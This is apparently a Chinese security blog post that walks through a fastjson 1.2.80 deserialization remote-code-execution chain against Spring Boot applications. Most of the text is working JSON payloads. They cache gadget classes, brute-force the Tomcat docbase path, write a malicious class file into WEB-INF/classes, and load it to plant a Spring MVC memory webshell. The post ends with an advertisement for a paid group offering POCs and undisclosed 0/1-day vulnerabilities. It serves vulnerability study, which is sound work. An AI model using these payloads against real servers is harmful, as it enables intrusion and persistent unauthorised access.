> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMDcxNzg4MA==&mid=2247484613&idx=1&sn=81017eb66ae71f551de7318bddcf1826

#  fastjson 1.2.80 springboot下rce利用链学习  
原创 zzz  良月安全   2025-06-20 01:30  
  
# 免责声明  
  
本公众号所发布的所有内容，包括但不限于信息、工具、项目以及文章，均旨在提供学习与研究之用。所有工具安全性自测。如因此产生的一切不良后果与文章作者和本公众号无关。如有涉及公司与个人敏感信息，侵权烦请告知，我们会立即删除并致歉。  
# fastjson 1.2.80 springboot下rce利用链学习  
## 前言  
  
fastjson 1.2.73-1.2.80版本，可通过如下payload加载继承了Exception的类  

```
{
    &#34;@type&#34;:&#34;java.lang.Exception&#34;,
    &#34;@type&#34;:&#34;calc&#34;
}

```

  
当在本地找不到要加载的类时，TomcatEmbeddedWebappClassLoader类加载器加载类时会尝试从tomcat-docbase下的WEB-INF/classes目录中查找类进行加载  
## 类缓存  
  
首先发送如下请求，将要用到的类加入到缓存  

```
{
    &#34;a&#34;: &#34;{    \&#34;@type\&#34;: \&#34;java.lang.Exception\&#34;,    \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.exc.InputCoercionException\&#34;,    \&#34;p\&#34;: {    }  }&#34;,
    &#34;b&#34;: {
      &#34;$ref&#34;: &#34;$.a.a&#34;
    },
    &#34;c&#34;: &#34;{  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.JsonParser\&#34;,  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&#34;,  \&#34;in\&#34;: {}}&#34;,
    &#34;d&#34;: {
      &#34;$ref&#34;: &#34;$.c.c&#34;
    }
  }

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rIctWiaMP3Zk9fBkrwqyMMZFVebPt7TPVls7w06KgPpvXmiciasCtp9lJA/640?wx_fmt=png&from=appmsg "")  
## 爆破路径  
  
然后需要获取tomcat-docbase的路径，利用列举目录的利用链来爆破获取
```
${file}
```

  
为要读取的文件目录，linux下启动的spring，tomcat-docbase的路径默认在/tmp下，
```
${data}
```

  
为需要爆破的路径的首字符，其格式如：[104]，如果正确则会返回对应的字符  

```
{
    &#34;a&#34;: {
      &#34;@type&#34;: &#34;java.io.InputStream&#34;,
      &#34;@type&#34;: &#34;org.apache.commons.io.input.BOMInputStream&#34;,
      &#34;delegate&#34;: {
        &#34;@type&#34;: &#34;org.apache.commons.io.input.BOMInputStream&#34;,
        &#34;delegate&#34;: {
          &#34;@type&#34;: &#34;org.apache.commons.io.input.ReaderInputStream&#34;,
          &#34;reader&#34;: {
            &#34;@type&#34;: &#34;jdk.nashorn.api.scripting.URLReader&#34;,
            &#34;url&#34;: &#34;${file}&#34;
          },
          &#34;charsetName&#34;: &#34;UTF-8&#34;,
          &#34;bufferSize&#34;: &#34;1024&#34;
        },
        &#34;boms&#34;: [
          {
            &#34;charsetName&#34;: &#34;UTF-8&#34;,
            &#34;bytes&#34;: ${data}
          }
        ]
      },
      &#34;boms&#34;: [
        {
          &#34;charsetName&#34;: &#34;UTF-8&#34;,
          &#34;bytes&#34;: [1]
        }
      ]
    },
    &#34;b&#34;: {&#34;$ref&#34;:&#34;$.a.delegate&#34;}
  }

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rfjExrcFXPtAZMphexU1H0zOUgkMcv31Kw3Sjyib8TtCsm6dQWN6GHKA/640?wx_fmt=png&from=appmsg "")  
  
第一个爆破成功了，就接着爆破第二个，[104,115]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rV5GBEyBtSpibtT2ibWGGtaQyN3GO76y1htGYzbMaSmqkAzdLB0OlJgbw/640?wx_fmt=png&from=appmsg "")  
  
如此，即可爆破出/tmp目录下tomcat-docbase的路径  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rhXODg7nianicMU2rRMDSLLy18ibGEhxjNVSNa6Kjk0cagbDLKmrbHS6icA/640?wx_fmt=png&from=appmsg "")  
## 写入class文件  
  
向tomcat-docbase的路径下写入/WEB-INF/classes/xxx.class文件，xxx.class文件就是我们构造的恶意class文件，利用如下文件写入链，
```
${shellcode}
```

  
为要写入的文件内容，
```
${size}
```

  
为要写入的文件大小，
```
${file2write}
```

  
为要写入的文件路径，这条利用链可以直接创建目录  

```
{
    &#34;a&#34;: {
      &#34;@type&#34;: &#34;java.io.InputStream&#34;,
      &#34;@type&#34;: &#34;org.apache.commons.io.input.AutoCloseInputStream&#34;,
      &#34;in&#34;: {
        &#34;@type&#34;: &#34;org.apache.commons.io.input.TeeInputStream&#34;,
        &#34;input&#34;: {
          &#34;@type&#34;: &#34;org.apache.commons.io.input.CharSequenceInputStream&#34;,
          &#34;cs&#34;: {
            &#34;@type&#34;: &#34;java.lang.String&#34;
            &#34;${shellcode}&#34;,
            &#34;charset&#34;: &#34;iso-8859-1&#34;,
            &#34;bufferSize&#34;: ${size}
          },
          &#34;branch&#34;: {
            &#34;@type&#34;: &#34;org.apache.commons.io.output.WriterOutputStream&#34;,
            &#34;writer&#34;: {
              &#34;@type&#34;: &#34;org.apache.commons.io.output.LockableFileWriter&#34;,
              &#34;file&#34;: &#34;${file2write}&#34;,
              &#34;charset&#34;: &#34;iso-8859-1&#34;,
              &#34;append&#34;: true
            },
            &#34;charset&#34;: &#34;iso-8859-1&#34;,
            &#34;bufferSize&#34;: 1024,
            &#34;writeImmediately&#34;: true
          },
          &#34;closeBranch&#34;: true
        }
      },
      &#34;b&#34;: {
        &#34;@type&#34;: &#34;java.io.InputStream&#34;,
        &#34;@type&#34;: &#34;org.apache.commons.io.input.ReaderInputStream&#34;,
        &#34;reader&#34;: {
          &#34;@type&#34;: &#34;org.apache.commons.io.input.XmlStreamReader&#34;,
          &#34;inputStream&#34;: {
            &#34;$ref&#34;: &#34;$.a&#34;
          },
          &#34;httpContentType&#34;: &#34;text/xml&#34;,
          &#34;lenient&#34;: false,
          &#34;defaultEncoding&#34;: &#34;iso-8859-1&#34;
        },
        &#34;charsetName&#34;: &#34;iso-8859-1&#34;,
        &#34;bufferSize&#34;: 1024
      },
      &#34;c&#34;: {}
    }

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rpDfpzriclQmWE2Iq53TxwAwhhE6AL87vRBkmmuW3EU3jNmA2jdHkcPA/640?wx_fmt=png&from=appmsg "")  
  
如果要确认有没有成功写入class文件，可以利用上面的爆破路径利用链读取/tmp/${docbase}/WEB-INF/classes目录进行确认  
## 类加载  
  
构造恶意类用jmg生成一个spring mvc的内存马就行了，需要继承Exception类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2r5hGoUjhMljJInibC5ibIxPN3EBoibHIoSw13wP4EFoYQCFnQQat8Dt0nQ/640?wx_fmt=png&from=appmsg "")  
  
最后发送如下poc，加载我们构造的恶意class文件  

```
{
    &#34;@type&#34;:&#34;java.lang.Exception&#34;,
    &#34;@type&#34;:&#34;StringUtilException&#34;
  }

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2rZDepNVLptIxFKoNNUOIIaoicqGxNgjTndJuyMWtfHOia33Ad2bRvaicmg/640?wx_fmt=png&from=appmsg "")  
  
成功注入内存马  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82gAibv5JEs3BaMoMHyG2vc2r8uuhAtffKwsaXXiapxUobuiakpw4qAuiaseOMEgcG0AQNNKiapRt4gtbCw/640?wx_fmt=png&from=appmsg "")  
## 参考链接  
  
https://xz.aliyun.com/news/16145 https://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA  
# 关于星球  
  
星球里有团队内部POC分享。星球定期更新安全内容，包括：内部漏洞库情报分享（包括部分未公开0/1day）、poc利用工具及内部最新研究成果。圈子目前价格为129元（交个朋友），后续人员加入数量多的话会考虑涨价（先到先得！！）感谢师傅们的支持！！![image](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82jgcXGIvrTZZpzXJ1uibrCtRRn4yytlCGSsSfRZicib62GlHaz4ibXI8zWEvTuoW9G3e76BmaRBgvpy0Q/640?wx_fmt=png&from=appmsg "")  
  
  
